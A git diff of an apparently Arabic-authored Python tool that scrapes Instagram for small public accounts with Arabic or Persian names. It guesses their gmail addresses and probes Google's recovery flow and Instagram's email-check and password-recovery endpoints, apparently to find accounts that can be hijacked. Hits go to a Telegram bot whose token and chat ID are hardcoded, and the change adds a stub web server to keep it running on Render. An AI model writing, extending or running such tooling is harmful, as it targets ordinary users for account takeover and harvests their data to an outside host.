@@ -64,10 +64,10 @@ from rich import box
 import re
 from threading import Thread  
 
-# ========== التوكن والـ ID مضافين مباشرة ==========
+# ========== التوكن والـ ID ==========
 TOKEN = "8738412833:AAH7aXrtQxqF2lq2EYSLI_EEWEFFOjqepLc"
 CHAT_ID = "5739065274"
-# =============================================
+# =================================
 
 def r(n): return ''.join(random.choices(string.ascii_letters + string.digits, k=n))
 
@@ -77,15 +77,15 @@ hits=0
 bads_instgram=0
 bads_email=0
 
-O = '\x1b[38;5;208m' #برتقالي
-R = '\033[1;31m' #احمر
-X = '\033[1;33m' #اصفر
-F = '\033[2;32m' #اخضر
-C = "\033[1;97m" #ابيض
-B = '\033[2;36m'#سمائي
+O = '\x1b[38;5;208m'
+R = '\033[1;31m'
+X = '\033[1;33m'
+F = '\033[2;32m'
+C = "\033[1;97m"
+B = '\033[2;36m'
 K = '\033[2;35m'
 C1 = '\033[2;35m'
-B = '\033[2;36m'#سمائي
+B = '\033[2;36m'
 BLUE = '\033[94m'
 RESET = '\033[0m'
 BOLD = '\033[1m'
@@ -97,14 +97,8 @@ MAGENTA = '\033[95m'
 RESET = '\033[0m'
 import json
 
-
 ids = []
 found_usernames = set()
-
-
-from rich.console import Console
-from rich.table import Table
-from rich import box
 
 console = Console()
 
@@ -121,13 +115,12 @@ table.add_row("My User : @D1_R4")
 table.add_row("")
 table.add_row("instagram Hidden followers")
 
-
 console.print(table)
 
 print("\n")
-# تم إزالة طلب الإدخال - التوكن والـ ID موجودين مباشرة في الكود
-print(f'{X}Token and ID loaded from code!{RESET}')
+print(f'{X}Token and ID loaded from code! Running on Render...{RESET}')
 print('')
+
 from requests import post as pp
 from user_agent import generate_user_agent as gg
 from random import choice as cc
@@ -135,6 +128,7 @@ from random import randrange as rr
 import re
 yy='azertyuiopmlkjhgfdsqwxcvbn'
 ids=[]
+
 def tll():
   try:
     n1=''.join(cc(yy)for i in range(rr(6,9)))
@@ -164,7 +158,6 @@ def tll():
       "Referrer-Policy": "strict-origin-when-cross-origin",
     'user-agent': str(gg()),
     }
-
 
     res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
     tok= re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
@@ -200,7 +193,9 @@ def tll():
   except Exception as e:
     print(e)
     tll()
+    
 tll()
+
 def check_gmail(email):
   if '@' in email:
     email = str(email).split('@')[0]
@@ -302,11 +297,8 @@ def rest(user):
     'x-ig-www-claim': 'hmac.AR3AqgCGaNYKiaGD2p6t-h92EOVCVTLghiUNPQi3RzQ-KVuI',
     'x-instagram-ajax': '1039957696',
     'x-requested-with': 'XMLHttpRequest',
-    
-
 }
 
-    
     r = httpx.Client(http2=True, headers=headers, timeout=20).post(
         "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/",
         data={"email_or_username": user,
@@ -388,7 +380,6 @@ def info(username, jj):
             with open('hits1.txt', 'a', encoding='utf-8') as ff:
                 ff.write(f'{msg}\n')
             
-
             try:
                 telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
                 response = requests.post(telegram_url, data={
@@ -396,7 +387,6 @@ def info(username, jj):
                     "text": msg
                 }, timeout=10)
                 
-
                 if response.status_code != 200:
                     print(f"Telegram error: {response.text}")
             except Exception as e:
@@ -416,7 +406,6 @@ def info(username, jj):
 ━━━━━━━━━━━━━━━
 @D1_R4
 """
-
         try:
             requests.post(
                 f"https://api.telegram.org/bot{TOKEN}/sendMessage",
@@ -428,17 +417,16 @@ def info(username, jj):
             
         with open('hits1.txt', 'a', encoding='utf-8') as ff:
             ff.write(f'{msg}\n')
+
 def Guts(email):
   global bads_email
   try:
-
     if 'good' == check_gmail(email):
         username,jj=email.split('@')
         info(username,jj)
     else:
         bads_email+=1
-
-  except:''
+  except:pass
 
 def check(email):
   global bads_instgram,hits,bads_email
@@ -448,56 +436,38 @@ def check(email):
     os.system('clear' if os.name == 'posix' else 'cls')
     tt = (f'''
  {YELLOW}*{YELLOW} {GREEN}Hits Instagram: {hits}{GREEN}
-	
  {YELLOW}*{YELLOW} {RED}Bad insta: {bads_instgram}{RED}
-	
  {YELLOW}*{YELLOW} {YELLOW}Email Not Available: {bads_email}{YELLOW}
- 
  {YELLOW}*{YELLOW} {YELLOW}email:{YELLOW}{email}
-	
  {YELLOW}*{YELLOW} {B}By: @D1_R4{B}
-	
 	''')
     print(tt)
     if pp == '0':
-
-
       url = "https://i.instagram.com/api/v1/users/check_email/"
       response = httpx.Client(http2=True).post(url, data=f"email={email}", headers={'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",'content-type': "application/x-www-form-urlencoded; charset=UTF-8"})
-      if 'email_is_taken' in str(response.text):Guts(email)
+      if 'email_is_taken' in str(response.text):
+          Guts(email)
       else:
           bads_instgram+=1
           os.system('clear' if os.name == 'posix' else 'cls')
           tt = (f'''
  {YELLOW}*{YELLOW} {GREEN}Hits Instagram: {hits}{GREEN}
-	
  {YELLOW}*{YELLOW} {RED}Bad insta: {bads_instgram}{RED}
-	
  {YELLOW}*{YELLOW} {YELLOW}Email Not Available: {bads_email}{YELLOW}
- 
  {YELLOW}*{YELLOW} {YELLOW}email:{YELLOW}{email}
-	
  {YELLOW}*{YELLOW} {B}By: @D1_R4{B}
-	
 	''')
           print(tt)
-          
     elif pp == '1':
           pass
-          
-  except:''
-
+  except:pass
 
 def contains_arabic_or_persian(text):
-
     if not text or not isinstance(text, str):
         return False
-    
-
     arabic_persian_pattern = re.compile(
         '[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]'
     )
-    
     return bool(arabic_persian_pattern.search(text))
         
 def rand_ids(existing_ids):  
@@ -512,7 +482,6 @@ def collect_users_1():
     found_usernames_1 = set()
 
     def worker():
-        global naif
         while True:
             try:
                 rnd = str(random.randint(150, 999))
@@ -579,13 +548,10 @@ def collect_users_1():
                 full_name = user_data.get('full_name', '')
                 
                 follower_count = user_data.get('follower_count', 0)
-                following_count = user_data.get('following_count', 0)
-                media_count = user_data.get('media_count', 0)
                 is_private = user_data.get('is_private', True)
 
                 if not username or username in found_usernames_1:
                     continue
-
 
                 if not contains_arabic_or_persian(full_name):
                     continue
@@ -593,20 +559,44 @@ def collect_users_1():
                 if any(x in username for x in ["_"]) or len(username) < 9:
                     continue
 
-                if is_private or follower_count>80:
+                if is_private or follower_count > 80:
                     continue
 
                 found_usernames_1.add(username)
-                email=username+'@gmail.com'
+                email = username + '@gmail.com'
                 check(email)
                                
-
             except Exception as e:
                 continue
-
 
     for _ in range(100):
         Thread(target=worker).start()
 
-# تشغيل البرنامج مباشرة بدون أي تعديلات
-collect_users_1()
+# ========== الجزء المهم لتشغيل البرنامج على Render ==========
+# تشغيل البرنامج الأساسي في thread منفصل
+bot_thread = Thread(target=collect_users_1)
+bot_thread.daemon = True
+bot_thread.start()
+
+# تشغيل خادم ويب بسيط جداً لإرضاء Render (لا يؤثر على البرنامج)
+try:
+    from http.server import HTTPServer, BaseHTTPRequestHandler
+    
+    class Handler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            self.send_response(200)
+            self.send_header('Content-type', 'text/plain')
+            self.end_headers()
+            self.wfile.write(b'Bot is running!')
+        def log_message(self, format, *args):
+            pass  # تعطيل السجلات
+    
+    port = int(os.environ.get('PORT', 8080))
+    server = HTTPServer(('0.0.0.0', port), Handler)
+    print(f'[+] Web server running on port {port} (for Render only)')
+    print('[+] Bot is working normally in background...')
+    server.serve_forever()
+except:
+    # إذا فشل الخادم، شغل البرنامج مباشرة
+    collect_users_1()
+# =======================================================
